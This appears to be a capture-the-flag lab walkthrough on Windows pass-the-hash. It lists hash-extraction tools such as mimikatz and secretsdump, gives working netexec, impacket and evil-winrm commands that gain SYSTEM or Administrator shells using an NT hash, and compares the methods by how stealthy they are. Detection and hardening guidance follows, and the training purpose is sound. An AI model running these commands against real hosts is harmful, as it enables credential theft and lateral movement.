  1. NEGOTIATE: client tells server "I want to do NTLM"
  2. CHALLENGE: server returns a random 8-byte challenge
  3. AUTHENTICATE: client computes HMAC-MD5(NT_HASH, challenge) and sends the result

The server (or KDC) verifies by computing the same HMAC against its stored NT hash for the user. If they match, authentication succeeds. Note what the protocol requires: the NT hash, not the plaintext. The plaintext is only ever needed when the NT hash itself is missing (i.e., when computing the NT hash from the password the user typed). Once the hash exists in any form; in SAM, in LSASS, in cached credentials, in the wire dump from a previous capture; it is interchangeable with the plaintext for any NTLM-accepting protocol.

docs.title: Where the hash comes from
docs.text: Source How secretsdump.py DCSync rights pull every domain user's NT hash from the DC mimikatz lsadump::sam Local SAM extraction on a compromised host mimikatz sekurlsa::logonpasswords LSASS memory dump on a compromised host lsassy Network-side LSASS dump (gives hashes for cached creds) pypykatz Cross-platform LSASS parsing (Linux-friendly) dpapi-ng Windows credential vault decryption LAPS read Plaintext local admin from ms-Mcs-AdmPwd (then NTLM-hash it locally) Captured Net-NTLM cracked Cracking Net-NTLMv2 yields plaintext, then compute NT hash

docs.title: What works with PtH and what doesn't
docs.text:
Protocol / Service PtH works? SMB (psexec, wmi, smbclient, etc.) Yes WinRM with NTLM auth Yes MSSQL with Windows auth Yes RDP Only with Restricted Admin mode + registry tweak Web SSO via NTLM (intranet sites) Yes Web SSO via Kerberos / SAML No (need plaintext or a TGT) Workgroup local logon at console No (need plaintext)

The exception list is short. Most operationally interesting access works PtH-direct.

docs.title: netexec PtH validation
docs.text:
netexec smb <target> -u Administrator -H '<NT hash>' --local-auth

-H accepts an NT hash (32 hex chars) instead of a password. --local-auth says "this is a local account, not a domain account." Drop --local-auth for domain accounts.

docs.title: psexec.py
docs.text:
psexec.py Administrator@<target> -hashes :<NT hash>

Format: LM_HASH:NT_HASH. LM is usually empty for modern hashes; just use :NT_HASH. Drops you to a SYSTEM shell on the target.

docs.title: wmiexec.py
docs.text:
wmiexec.py Administrator@<target> -hashes :<NT hash>

Quieter than psexec (no service install). Runs commands as Administrator (not SYSTEM). No interactive shell semantics; each command is a separate WMI invocation.

docs.title: smbexec.py
docs.text:
smbexec.py Administrator@<target> -hashes :<NT hash>

Drops to a SYSTEM shell via SMB-only protocol. Less detection than psexec.

docs.title: evil-winrm with hash
docs.text:
evil-winrm -i <target> -u Administrator -H <NT hash>

Native PowerShell shell over WinRM. The cleanest interactive experience.

docs.title: Step 1: Validate the Hash
docs.text:
Before chaining any execution tool, confirm the hash actually authenticates. netexec smb does the cheapest possible NTLM exchange (NEGOTIATE / CHALLENGE / AUTHENTICATE then session disconnect) and prints whether the hash worked. The probe catches hash typos and stale credentials before you spend time on a noisier execution attempt.

Kali - Confirm hash works

netexec smb ws-mem-${OCR_SCOPE_TOKEN} \
  -u Administrator -H '<NT hash>' --local-auth
Flag Effect smb Use the SMB protocol module. -u Administrator Username (local). -H '<hash>' NT hash (32 hex chars). Replaces -p. --local-auth Authenticate as a local account, not domain. Drop this for domain accounts.

[+] indicates success. The output also shows the target OS string, signed/unsigned SMB, and (with --shares) the available shares.

docs.title: Step 2: Pick Your Execution Method
docs.text:
The four common methods compared:

Method Privilege Detection Interactive psexec.py SYSTEM Service install (loud) Yes smbexec.py SYSTEM Service install via SMB only (quieter than psexec) Yes wmiexec.py Administrator WMI process create (medium) Pseudo evil-winrm Administrator WinRM session (often allowlisted for admins) Yes

For this exercise, any of them works. Use evil-winrm for the cleanest interactive PowerShell.

docs.title: Step 3: Read the Flag (evil-winrm)
docs.text:
evil-winrm wraps the WinRM protocol (HTTP on TCP 5985 by default, HTTPS on 5986). With -H it sends NTLM with the NT hash directly. The remote PowerShell session runs as Administrator (not SYSTEM); for this exercise, Administrator can read the file.

Kali - Connect via evil-winrm

evil-winrm -i ws-mem-${OCR_SCOPE_TOKEN} \
  -u Administrator -H '<NT hash>'
Flag Effect -i <host> Target hostname or IP. -u <user> Username. -H <hash> NT hash (no quoting required by evil-winrm but quote to be safe).

At the PowerShell prompt:

PS C:\> type C:\flags\pth_flag_${OCR_SCOPE_TOKEN}.txt

Submit the OCR{...} value.

docs.title: Step 4: Compare Methods
docs.text:
For practice, run the same operation through psexec, wmiexec, and smbexec, noting the differences in shell semantics and what the SOC would see for each.

Kali - psexec.py

psexec.py Administrator@ws-mem-${OCR_SCOPE_TOKEN} -hashes :<NT hash>
Token Effect <user>@<host> impacket auth string. -hashes :<NT> LM:NT hash format; LM is empty so the colon is leading.

Drops to C:\Windows\system32 as NT AUTHORITY\SYSTEM. Generates event 7045 (service install) on the target.

Kali - wmiexec.py

wmiexec.py Administrator@ws-mem-${OCR_SCOPE_TOKEN} -hashes :<NT hash>

Each command is a one-shot WMI process invocation; no persistent shell. Quieter than psexec because no service is installed.

Common gotchas

  • Hash format mismatch: impacket scripts want LM:NT (LM half is usually empty so use :NT). netexec wants just NT for -H. evil-winrm wants just NT for -H. Mixing the two formats produces STATUS_LOGON_FAILURE.
  • Wrong account scope: --local-auth validates against the target's local SAM. Without it, netexec authenticates against AD. The same hash may exist in both stores with different values for accounts that share a name; check the source.
  • WinRM disabled: evil-winrm fails with Connection refused if WinRM is not running. Fall back to psexec or wmiexec, both of which use SMB.
  • Account lockout: even though PtH does not "fail" in the traditional sense, multiple wrong-hash attempts increment badPwdCount on the account. Two stale-hash attempts plus a real user typo can lock the local Administrator. Be deliberate.

docs.title: Blue Team Perspective
docs.text:
Pass-the-Hash itself produces no unique signal at the protocol level; defenders detect on the lateral pattern that follows.

Activity Event ID Where it fires Lateral logon as local Administrator 4624 logon type 3 Target Security log psexec service install 7045 Target System log Suspicious authentication (NTLM type) 4624 with Authentication Package = NTLM from non-DC source Target Security log Defender for Identity "Suspected identity theft (pass-the-hash)" MDI

What detection is realistic

PtH-specific detection is hard because the wire bytes are identical to legitimate NTLM auth. The detection that works is on the identity reuse pattern: the same local Administrator account authenticating to many machines from one source IP within a short window. Microsoft Defender for Identity ships this detection as "Lateral movement using local admin credentials." SIEM rule: alert when a local Administrator account succeeds at NTLM auth on more than 3 distinct hosts within 5 minutes.

docs.title: Hardening Note
docs.text:
PtH disappears as an attack class when you disable NTLM and rotate local admin passwords per host. The list below is the realistic order of operations.

PtH hardening

  • Deploy LAPS (legacy or Windows LAPS) to give every host a unique random local admin password.
  • Audit and reduce NTLM usage with event 8001 logging; migrate consumers to Kerberos.
  • Disable NTLM outbound on Tier-0 servers and inbound on DCs first.
  • Restrict local admin lateral logon via Deny access to this computer from the network for Domain Users and Local accounts GPOs.
  • Enforce Credential Guard on managed workstations to make LSASS dumps useless on modern Windows.
  • Build SIEM detection on cross-host local-admin NTLM auth bursts.

docs.title: Record Your Findings
docs.text:
Method used:

evil-winrm | psexec.py | wmiexec.py | smbexec.py

Privilege achieved:

SYSTEM | Administrator

Flag:

(OCR{pth_...})

docs.title: Analysis Questions
docs.text:
